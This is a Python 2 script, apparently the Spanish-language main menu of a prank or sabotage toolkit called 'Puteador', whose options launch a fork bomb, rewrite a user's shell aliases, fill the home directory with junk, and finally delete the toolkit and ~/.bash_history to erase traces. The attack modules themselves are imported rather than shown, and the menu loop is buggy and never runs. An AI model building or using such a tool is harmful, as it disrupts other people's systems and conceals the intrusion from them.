import os
import bombaFork
import cambiaAlias
import cagetizador

os.system('clear')

print "Escoja una opcion:\n"
print "\t 1. Bomba fork.(Solo en Linux)\n"
print "\t 2. Cagetizador.\n"
print "\t 3. Cambiar alias.\n"
print "\t 4. Trolling.\n"
print "\t 5. Llenar home de basura.\n"
print "\t 99. Salir y borrar todo.\n"
#print "\t 6. Quijotizador.\n"
salir=True
opcion = input('Introduzca una opcion:')

while not salir:
    if opcion == 1:
        print "Bomba Fork"
        bombaFork.fork()
    elif opcion == 2:
        print "Cagetizando..."
        cagetizador.caguetizadorPy()
    elif opcion == 3:
        print "Cambia alias..."
        cambiaAlias.cambiarComandos()
    elif opcion == 4:
        print 'Ejecuta Trolling'
    elif opcion == 5:
        print 'Ejecuta llenar home de basura'
    elif opcion == 99:
        print "Saliendo... y borrando rastro"
        shutil.rmtree('../Puteador')
        os.remove('~/.bash_history') # cambiar por algo mas elegante como borrar las ultimas lineas de ese fichero
    else:
        print 'Opcion no valida.'
